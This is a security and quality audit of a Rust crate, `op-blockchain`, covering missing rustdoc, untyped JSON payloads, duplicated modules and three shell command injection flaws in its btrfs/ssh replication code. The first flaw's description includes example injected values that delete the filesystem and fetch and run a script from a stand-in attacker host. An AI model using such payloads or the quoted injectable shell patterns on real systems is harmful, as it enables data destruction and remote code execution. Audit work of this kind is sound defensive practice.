# Production Security & Quality Audit: `op-blockchain`

## 1. Documentation Audit & Quality Standards

### Crate-Level Documentation
The crate-level `//!` documentation is present in `crates/op-blockchain/src/lib.rs:1-9` and covers:
* Streaming blockchain for audit trails.
* Plugin footprints for change tracking.
* Dual BTRFS subvolumes (timing/vectors/state).
* Automatic snapshots with configurable intervals.
* Rolling retention policies.
* `btrfs send/receive` for replication.

---

### Pub Item Documentation Sample

Out of 10 sampled public items across the codebase, 5 are missing standard `///` rustdoc documentation.

| # | Item Name / Signature | File & Line Location | Status |
|---|---|---|---|
| 1 | `pub struct OptimizedBlockchain` | `crates/op-blockchain/src/btrfs_numa_integration.rs:20` | **Pass** (Has rustdoc) |
| 2 | `pub async fn new(...)` | `crates/op-blockchain/src/btrfs_numa_integration.rs:28` | **Pass** (Has rustdoc) |
| 3 | `pub async fn get_cached_block(...)` | `crates/op-blockchain/src/btrfs_numa_integration.rs:117` | **Pass** (Has rustdoc) |
| 4 | `pub struct BlockEvent` | `crates/op-blockchain/src/footprint.rs:8` | **Pass** (Has rustdoc) |
| 5 | `pub struct PluginFootprint` | `crates/op-blockchain/src/footprint.rs:46` | **Pass** (Has rustdoc) |
| 6 | `pub struct PluginFootprint` | `crates/op-blockchain/src/plugin_footprint.rs:10` | **Fail** (No `///` rustdoc) |
| 7 | `pub struct FootprintGenerator` | `crates/op-blockchain/src/plugin_footprint.rs:48` | **Fail** (No `///` rustdoc) |
| 8 | `pub fn new(...)` | `crates/op-blockchain/src/plugin_footprint.rs:52` | **Fail** (No `///` rustdoc) |
| 9 | `pub fn from_env() -> Self` | `crates/op-blockchain/src/retention.rs:53` | **Fail** (No `///` rustdoc) |
| 10 | `pub enum SnapshotInterval` | `crates/op-blockchain/src/streaming_blockchain.rs:24` | **Fail** (No `///` rustdoc) |

---

### README.md Presence
No `README.md` file was provided in the source files of the audited crate `op-blockchain`.

---

### Public Unsafe Functions
There are **no** public `unsafe fn` definitions within the provided source files. Consequently, no invariant safety documentations are missing. 

*Note: The crate contains internal `unsafe` blocks (e.g., zero-copy string deserialization using `simd_json::from_str` at `btrfs_numa_integration.rs:136`, `blockchain.rs:232`, and `streaming_blockchain.rs:218`). These blocks do not have safety comments explaining their invariants.*

---

## 2. Architectural & Schema Discipline Violations

The codebase fails the **Schema-as-Code** discipline by relying on ad-hoc structs and strings to represent critical data contracts instead of versioned Protocol Buffers or OSCAL schemas.

### Ad-hoc JSON Serialization & Construction
* **`crates/op-blockchain/src/btrfs_numa_integration.rs:98-106`**: Block caching constructs a loosely typed `simd_json::json!` object rather than utilizing a schema-defined struct.
* **`crates/op-blockchain/src/footprint.rs:107-112`**: Conversion of `PluginFootprint` to `BlockEvent` manually formats an untyped JSON block.
* **`crates/op-blockchain/src/streaming_blockchain.rs:141-146`**: The timing event serialization dynamically structures untyped parameters inside `simd_json::json!`.
* **`crates/op-blockchain/src/streaming_blockchain.rs:158-168`**: Metadata and vector features are serialized dynamically, making contract validation impossible at compilation.

### Arbitrary Untyped Fields
* **`crates/op-blockchain/src/footprint.rs:12`**: The `data` field of `BlockEvent` is defined as `simd_json::OwnedValue`. This allows arbitrary untyped payloads to enter the blockchain without validation against structural constraints or version histories.

### Recommended Remediation
Refactor `BlockEvent` and `PluginFootprint` into versioned Protocol Buffer schemas using `prost` (already available in the workspace dependencies). Ensure all blockchain payloads are validated using generated deserialization targets instead of unchecked `simd_json::OwnedValue` buffers.

---

## 3. Technical & Critical Security Vulnerabilities

### CRITICAL-01: Local Command Injection via Shell Interpolation in `stream_to_remote`
* **File/Line**: `crates/op-blockchain/src/blockchain.rs:205-212`
* **Impact**: Critical / Arbitrary Code Execution (RCE)
* **Description**:
  The `stream_to_remote` method constructs a shell command string using `format!` and executes it inside a shell using `Command::new("sh").arg("-c")`.
  ```rust
  let output = Command::new("sh")
      .arg("-c")
      .arg(format!(
          "btrfs send {} | ssh {} 'btrfs receive {}'",
          snapshot_path.display(),
          remote_path,
          remote_path
      ))
  ```
  The parameter `remote_path` is formatted directly into the shell string without sanitization or escaping. If the `remote_path` variable is sourced from database settings, user input, or network configurations, an attacker can append shell metacharacters (e.g., `; rm -rf /` or `; curl http://attacker.com/shell | sh`) to run arbitrary commands on the system with the privileges of the running Rust process.
* **Remediation**:
  Avoid running shell pipes via `sh -c`. Spawn commands directly using `Command::new("btrfs")` and pipe standard output to a child process `Command::new("ssh")` using `std::process::Stdio`.

---

### CRITICAL-02: Local Command Injection via Shell Interpolation in `stream_vectors`
* **File/Line**: `crates/op-blockchain/src/streaming_blockchain.rs:438-446`
* **Impact**: Critical / Arbitrary Code Execution (RCE)
* **Description**:
  The `stream_vectors` method interpolates `remote` directly into a `bash` shell command:
  ```rust
  let output = Command::new("bash")
      .arg("-c")
      .arg(format!(
          "btrfs send {} | ssh {} 'btrfs receive /var/lib/blockchain/vectors/'",
          vector_snapshot.display(),
          remote
      ))
  ```
  Because the `remote` argument is formatted as a raw string into a shell execution context, an attacker-controlled remote address or host configuration can trigger local shell execution.
* **Remediation**:
  Avoid invoking `bash -c`. Use direct `Command` execution with multi-process pipes.

---

### CRITICAL-03: Local Command Injection via `stream_to_replicas` Shell Generation
* **File/Line**: `crates/op-blockchain/src/streaming_blockchain.rs:467-478`
* **Impact**: Critical / Arbitrary Code Execution (RCE)
* **Description**:
  The `stream_to_replicas` method constructs a highly complex shell command by appending replica strings into process-substitution subshells:
  ```rust
  let mut tee_args = Vec::new();
  for replica in replicas {
      tee_args.push(format!(
          ">(ssh {} 'btrfs receive /var/lib/blockchain/vectors/')",
          replica
      ));
  }

  let cmd = format!(
      "btrfs send {} | tee {} > /dev/null",
      vector_snapshot.display(),
      tee_args.join(" ")
  );
  ```
  If any element within the `replicas` slice contains shell syntax, `bash` will parse and execute it locally as part of the process substitution redirection block.
* **Remediation**:
  Do not use shell-based redirection. Implement multi-replica streaming directly in Rust by spawning the `ssh` processes, copying the `btrfs send` stream to an internal buffer, and writing that buffer concurrently to the `stdin` of each spawned child process.

---

### HIGH-01: Split-Brain Core Logic Duplication
* **File/Line**: 
  * `crates/op-blockchain/src/blockchain.rs` vs `crates/op-blockchain/src/streaming_blockchain.rs`
  * `crates/op-blockchain/src/footprint.rs` vs `crates/op-blockchain/src/plugin_footprint.rs`
* **Impact**: High / Maintenance & Logic Divergence
* **Description**:
  The codebase contains duplicate implementations for key structures:
  * Two fully realized implementations of the `StreamingBlockchain` struct are present: one in `blockchain.rs` and another in `streaming_blockchain.rs`. They have different structural fields and diverging method signatures. For instance, `btrfs_numa_integration.rs` uses the version defined in `streaming_blockchain.rs`, whereas `lib.rs` re-exports the version defined in `blockchain.rs`.
  * Two separate implementations of the `PluginFootprint` struct are present in `footprint.rs` and `plugin_footprint.rs`.
* **Remediation**:
  Consolidate files. Delete the duplicate `streaming_blockchain.rs` and `plugin_footprint.rs` modules. Unify their logic under single, non-overlapping structs in `blockchain.rs` and `footprint.rs`.